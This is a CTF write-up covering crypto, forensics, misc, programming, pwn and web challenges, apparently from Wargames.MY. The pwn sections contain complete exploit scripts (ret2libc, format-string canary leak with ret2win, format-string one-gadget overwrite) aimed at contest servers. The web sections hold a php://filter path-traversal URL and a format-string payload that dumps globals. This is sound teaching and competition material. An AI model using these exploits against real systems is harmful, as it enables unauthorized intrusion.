# Crypto: N-less RSA (903)

## idea
We notice that $p$ and $q$ are related by $q=13p+37\times0\text{xcafebabe}+\epsilon$ where $\epsilon$ is a small number due to the `next_prime` function. Since we are gievn $\phi$ and we know $\phi=(p-1)(q-1)$, we now have $2$ equations and $2$ unknowns, $p,q$ and we can solve for the unknowns. For $\epsilon$, we simply brute force it

## script
```python=
phi=340577739943302989719266782993735388309601832841016828686908999285012058530245805484748627329704139660173847425945160209180457321640204169512394827638011632306948785371994403007162635069343890640834477848338513291328321869076466503121338131643337897699133626182018407919166459719722436289514139437666592605970785141028842985108396221727683676279586155612945405799488550847950427003696307451671161762595060053112199628695991211895821814191763549926078643283870094478487353620765318396817109504580775042655552744298269080426470735712833027091210437312338074255871034468366218998780550658136080613292844182216509397934480
e=65537
c=42363396533514892337794168740335890147978814270714150292304680028514711494019233652215720372759517148247019429253856607405178460072049996513931921948067945946086278782910016494966199807084840772350780861440737097778578207929043800432279437709296060384506082883401105820800844187947410153745248466533960754243807208804084908637481187348394987532434982032302570226378255458486161579167482667571132674473067323283939026297508548130085016660893371076973067425309491443342096329853486075971866389182944671697660246503465740169215121081002338163263904954365965203570590704089906222868145676419033148652705335290006075758484
epsilon = 0
while True:
    q = (-126010588520+epsilon+sqrt(15878668419660798144484-252021177044*epsilon+epsilon^2+52*phi))/2
    if q in ZZ:
        break
    epsilon += 1
p = phi/(q-1)+1
n = p*q
d = 1/e%(phi)
print(bytes.fromhex(hex(pow(c,d,n))[2:]))
```

## flag
`wgmy{a9722440198c2abad490478875be2815}`

# Crypto: Hohoho 2 (990)

## idea
We see that the challenge is to forge a token with a username that contains `Santa Claus`. We first look at the token generation function:

## script
```python=
def generateToken(name):
	x = bytes_to_long(name.encode(errors="surrogateescape"))
	x = ((pow(a, n, (a-1)*m) - 1) // (a-1) * c + pow(a, n, m) * x) % m
	return hex(x)[2:]
```

This function is a linear funciton in `name`, so we can simply get two tokens and figure what the coefficients are without knowing $n$, i.e.

$$\text{token}_0=a_0+a_1\text{name}_0$$
$$\text{token}_1=a_0+a_1\text{name}_1$$

Then we can forge a token with the name `Santa Claus`.

## Script

```python=
from pwn import *
from Crypto.Util.number import bytes_to_long

m = 0xb00ce3d162f598b408e9a0f64b815b2f
r = remote("13.229.150.169",32895)
m0 = "a"
m1 = "b"
m2 = "Santa Claus"
x0 = bytes_to_long(m0.encode(errors="surrogateescape"))
x1 = bytes_to_long(m1.encode(errors="surrogateescape"))

r.sendlineafter(b"Enter option: ",b"1")
r.sendlineafter(b"Enter your name: ",m0.encode())
r.recvuntil(b"Use this token to login: ")
y0 = int(r.recvline(),16)
r.sendlineafter(b"Enter option: ",b"1")
r.sendlineafter(b"Enter your name: ",m1.encode())
r.recvuntil(b"Use this token to login: ")
y1 = int(r.recvline(),16)
a1 = (y1-y0)*pow(x1-x0,-1,m)%m
a0 = (y1-a1*x1)%m
x2 = bytes_to_long(m2.encode(errors="surrogateescape"))
y2 = hex((a0+a1*x2)%m)[2:].encode()
r.sendlineafter(b"Enter option: ",b"2")
r.sendlineafter(b"Enter your name: ",m2.encode())
r.sendlineafter(b"Enter your token: ",y2)
r.sendlineafter(b"Enter option: ",b"4")
r.interactive()
```

## flag
(didnt save it)

# Crypto: Hohoho 2 continue (996)

## idea
The difference from the previous challenge is that we cannot generate tokens anymore, so we need a new approach. Looking at the comments, we notice that the token generation is simply a iterated LCG:
```python=
	# LCG fast skip implementation
	# is equivalent to the following code
	# for _ in range(n):
	# 	x = (a*x + c) % m
	x = ((pow(a, n, (a-1)*m) - 1) // (a-1) * c + pow(a, n, m) * x) % m
```
so if we set $x=ax+c\pmod m$, then the token and our name are the same$\pmod m$! But now the problem is that we require our solution to be in ASCII. This can be done by solving a CVP problem:

Let $\mathcal L=\{v\in\mathbb R^n:\sum_iv_i256^i=x\pmod m\}$. Then every vector in this lattice is a solution, as long as it's components are valid ascii. Since the 'average' of valid ascii is about `O=0x4f`, we simply need to find the closest vector to this. 

However, we do want `Santa Claus` to be in our solution. To do this, notice that if $s\pmod{256^{11}}=\text{Santa Claus}$, then $s$ will contain `Santa Claus` as its last $11$ characters. Hence we use CRT to find a solution to $s\pmod{256^{11}}=\text{Santa Claus}$ and $s\pmod m=x$ and replace our lattice with solutions to $\sum_iv_i256^i=s\pmod{m\cdot256^{11}}$ and we find the closest vector to `OO...OOOSanta Claus`.

## code
```python
m = 0xb00ce3d162f598b408e9a0f64b815b2f
a = 0xaaa87c7c30adc1dcd06573702b126d0d
c = 0xcaacf9ebce1cdf5649126bc06e69a5bb
x = b"Santa Claus"
n = [m,0x100^len(x)]
x = [c/(1-a)%m,int(x.hex(),16)]
print("token",hex(x[0])[2:])
x = crt(x,n)
n = prod(n)

from string import printable
valid_chars = printable.strip().encode()

d = 50
ascii_v = vector(b'O'*(d-1))
sol_v = bytes.fromhex(x.hex())
sol_v = vector(sol_v[::-1]+b'\x00'*(d-1-len(sol_v)))
target_v = ascii_v-sol_v

L = Matrix(d,d)
for i in range(d-1):
    L[i,i] = 1
    L[i,d-1] = 0x100^i*n^2
L[d-1,d-1] = n*n^2
L = L.BKZ(block_size=25)
L = Matrix([i[:-1] for i in L[:-1]])
# for v in L[:-1]: assert sum(0x100^n*i for n,i in enumerate(v[:-1]))%n == 0

G = L.gram_schmidt()[0]
for i in reversed(range(G.nrows())):
    target_v -=  L[i] * ((target_v * G[i]) / (G[i] * G[i])).round()

nsol_v = ascii_v - target_v
print("name",bytes(nsol_v)[::-1].decode())
```

```
token 1327b0e270df8c87fc0e6e7be6bdd2e1
name QMMKQPLMQJTMPLIJMMQKMSMNPMOTNRPRKONKPLSanta Claus
```

## flag
(didnt save it)

## ps
after the CTF, [someone on discord](https://discord.com/channels/1180842091199336458/1180842092457631776/1185944000780316692) mentioned you can just brute force. It turns out because $m$ is small, this is easily doable, as $m<256^{16}$, so the chance of $x+km$ being valid ascii for a random $k$ is approximately
$$\left(\frac{94}{256}\right)^{16}\approx\frac{1}{9158000}$$
assuming $k$ is small. This is easily brute forcible! I wrote a optimized brute force script brute forcing the top bits instead of iteratively doing $x+km$ which took about $20$ seconds to get the solution, a bit slower than LLL but a lot easier math-wise.

code:

```python
from Crypto.Util.number import bytes_to_long, long_to_bytes
from string import printable
from itertools import product
from tqdm import tqdm

pos = printable.strip().encode()
m = 0xb00ce3d162f598b408e9a0f64b815b2f
a = 0xaaa87c7c30adc1dcd06573702b126d0d
c = 0xcaacf9ebce1cdf5649126bc06e69a5bb
x = c*pow(1-a,-1,m)%m
s = b"Santa Claus Hohoho 2"
padl = 0x100**len(long_to_bytes(m))

i = 0
while True:
    for pad in tqdm(product(pos,repeat=i)):
        offset = (x-bytes_to_long(s+bytes(pad))*padl)%m
        while offset < padl: # edited just in case code never terminates because m is too close to 0x100^x
            if all(i in pos for i in long_to_bytes(offset)):
                break
            offset += m
        if offset < padl: break
    else:
        i += 1
        continue
    break
print(s+bytes(pad)+long_to_bytes(offset))
```

```
1it [00:00, 17260.51it/s]
94it [00:00, 323167.69it/s]
8836it [00:00, 380208.98it/s]
830584it [00:02, 359092.97it/s]
6667014it [00:19, 337182.90it/s]
b'Santa Claus Hohoho 282N#o#|aty3/pyiP$.>#'
```

# Forensics: Compromised (250)

- Realise the desktop `flag.png` is a encrypted zip file containing `flag.txt`
- Recover the bitmaps from the cache file which contains screenshots of the zip password
    - Bitmaps are from `AppData\Local\Microsoft\Terminal Server Client\Cache\Cache0000.bin`
    - Bitmaps can be recovered via `bmc-tools`

# Misc: Splice (880)

- For the 1st and 2nd qr, we have enough info to determine the flag via [qrazybox](https://merri.cx/qrazybox/)

    
# Misc: Sayur (999)

- Plot the LSB of the image to realise hidden data row-wise in all RGBA channels for the first two bits
- Just bruteforce the channel orderings to find the ascii.
- Replace each word with the index in which it occurs in the meme in the original image. Perform the replacement like `<1> -> 00, <2> -> 01, <3> -> 10, <4> -> 11`
- Repeat multiple times to get the flag

# PPC: Linux Memory Usage (366)

```cpp=
#include <iostream>
#include <vector>
#include <unordered_map>

using namespace std;

unordered_map<int, int> procs;
unordered_map<int, vector<int>> child;
unordered_map<int, int> visited;

int query(int pid) {
    if (visited.find(pid) != visited.end()) return visited[pid];
    if (procs.find(pid) == procs.end()) return 0;
    int r = procs[pid];
    if (child.find(pid) != child.end()) {
        for (int c : child[pid]) {
            r += query(c);
        }
    }
    visited[pid] = r;
    return r;
}

int main() {
    int N, Q;
    cin >> N >> Q;

    procs[0] = 0;

    for (int i = 0; i < N; ++i) {
        int pid, ppid, mem;
        cin >> pid >> ppid >> mem;
        procs[pid] = mem;
        child[ppid].push_back(pid);
    }

    for (int i = 0; i < Q; ++i) {
        int query_pid;
        cin >> query_pid;
        cout << query(query_pid) << endl;
    }

    return 0;
}
```

- Create a mapping of A: process -> memory_usage and B: process -> child list.
- To compute memory usage of a process and its children (`query`), recursively traverse via B and get mem usage via A.
- To avoid recomputation across multiple queries, we save the result of each invocation of query into a dictionary, and retrieve the result from there if required again

# PPC: Lokami Temple (693)

```python
N = int(input())
ls = [[] for _ in range(N)]
for _ in range(N-1):
    a,b = (*map(int, input().split(" ")),)
    a -= 1; b -= 1
    ls[a].append(b)
    ls[b].append(a)

start = 0
paths = [None for _ in range(N)]
visited = set()

def build_paths(start, curr_path):
    if start in visited: return
    visited.add(start)
    ns = ls[start]
    paths[start] = curr_path
    for i,n in enumerate(ns):
        build_paths(n, (*curr_path, i))

build_paths(0, ())

def query(x,y):
    px, py = paths[x], paths[y]
    i = 0
    for i in range(min(len(px), len(py))):
        if px[i] != py[i]: break
    else:
        return abs(len(px) - len(py))
    return len(px) + len(py) - 2*i

dists = [[query(x,y) for y in range(N)] for x in range(N)]
uwu = [*map(max, dists)]
cd = min(uwu)
entrances = [i for i,d in enumerate(uwu) if d == cd]
exits = sorted(list(set([i for e in entrances for i,d in enumerate(dists[e]) if d == cd])))

print("Entrance(s):", " ".join(str(i+1) for i in entrances))
print("Exit(s):", " ".join(str(i+1) for i in exits))
print("Path Length:", cd)
```

- Compute the paths from node 1 to all the other nodes
- To compute the distance between two nodes `x` and `y`, diff the paths and sum the length of the differences

# Pwn: Magic Door (942)
## idea
basic ret2libc after passing the first check in the function `open_the_door`

```c
__int64 open_the_door()
{
  char s1[12]; // [rsp+0h] [rbp-10h] BYREF
  int v2; // [rsp+Ch] [rbp-4h]

  initialize();
  puts("Welcome to the Magic Door !");
  printf("Which door would you like to open? ");
  __isoc99_scanf("%11s", s1);
  getchar();
  if ( !strcmp(s1, "50015") )
    return no_door_foryou();
  v2 = atoi(s1);
  if ( v2 != 50015 )
    return no_door_foryou();
  else
    return magic_door(50015LL);
}
```

In this function, the check will fail if the string you enter is exactly `50015`, and it will fail if the integers in the string you entered is not `50015`. Therefore, it is possible to pass this check by simply appending a letter to the end of `50015`.

After reaching the `magic_door` function, we can exploit it as we usually do with ret2libc challenges. The only problem faced here was that there was a slight libc mismatch between the libc in the docker we were provided and the libc on the remote server, therefore after testing with another libc version, the exploit worked on remote.

## solution script
```python
from pwn import *

#p = process('./magic_door')
p = remote('13.229.84.41', 10002)
context.binary = elf = ELF('./magic_door')
libc = ELF('./libc.so.6')

p.sendline(b'50015a')

payload = b'A'* 72

rop = ROP(elf)
rop.call(rop.ret[0])
rop.puts(elf.got.puts)
rop.puts(elf.got.printf)
rop.magic_door()


p.sendline(payload + rop.chain())

p.recvuntil(b'go? \n')

#puts = hex(u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00')))
#printf = hex(u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00')))
#
#print(puts)
#print(printf)

puts = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))
printf = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))

libc.address = puts - libc.sym.puts

binsh = (next(libc.search(b'/bin/sh')))
rop = ROP([libc, elf])
rop.call(rop.ret[0])
rop.system(binsh)
p.sendline(payload + rop.chain())

p.clean()

p.interactive()
```

# Pwn: Pak Mat Burger (990)
## idea
format string + canary + ret2win

```sh
pak-mat-burger ➜ checksec pakmat_burger
[*] '/home/vela/wargamesmy/pak-mat-burger/pakmat_burger'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

for this challenge, the secret always stays the same, therefore we can hardcode it into the solution

we can then leak the necessary addresses and carry out the exploit to get the flag.


## solve script
```python
from pwn import *

#p = process('./pakmat_burger')
p = remote('13.229.84.41', 10003)

p.sendline(b'%13$p.%17$p')

p.recvuntil(b'Hi ')

secret = b'8d7e88a8'
#secret = b'secret'
canary = p.recvuntil(b'.').strip(b'.')
leak = p.recvuntil(b',').strip(b',')

print(secret)
print(canary)
print(leak)

win = int(leak, 16) - 0x1a
ret = int(leak,16) + 0x18a
print(win)
p.sendline(secret)

p.sendline(b'a')

payload = b'A' * 0x25
payload += p64(int(canary, 16))
payload += b'A' * 8
payload += p64(ret)
payload += p64(win)

p.sendline(payload)


p.interactive()
```

# Pwn: Free Juice (996)
## idea 
this looked like a heap challenge, but it could be solved with just the format string vulnerability that exists in `secret_juice`

by using the format string vulnerability, we can leak the addresses and use gadgets to get shell on the server 

## solve script
```python
from pwn import *

#p = process('./free-juice')
p = remote('13.229.84.41', 10001)

context.binary = elf = ELF('./free-juice')
libc = ELF("./lib/libc-2.23.so")

p.sendline(b'1')
p.sendline(b'1')
p.sendline(b'1337')

payload = b'%2$p.%12$p'

p.sendline(payload)

p.recvuntil(b' : ')
# libc leak
leak = p.recvuntil(b'.').strip(b'.')
# stack leak
stack_leak = p.recvuntil(b'\n').strip(b'\n')
print(leak)
print(stack_leak)

libc.address = int(leak, 16) - 0x3c6780
ret_addr = int(stack_leak, 16) + 0x8
shell = libc.address + 0x45226

p.sendline(fmtstr_payload(6, {ret_addr: shell}))
p.sendline(b'4')

p.interactive()
```

# Web: Warmup - Web (924)

- Auto-deobfuscate the js to get the password
- Realise its path traversal with the `x` GET param and use `php://filter/read=zlib.deflate/resource=???` to leak the source code of any php file and hence get the flag. URL should be `warmup.wargames.my/api/4aa22934982f984b8a0438b701e8dec8.php?x=php://filter/read=zlib.deflate/resource=flag_for_warmup.php`.
- Just zlib inflate the whole thing.

# Web: Pet Store Viewer (990)

- There's a format string vuln in the server so just replace the image path field with `{0.__init__.__globals__}` to dump globals variables and hence leak the flag.
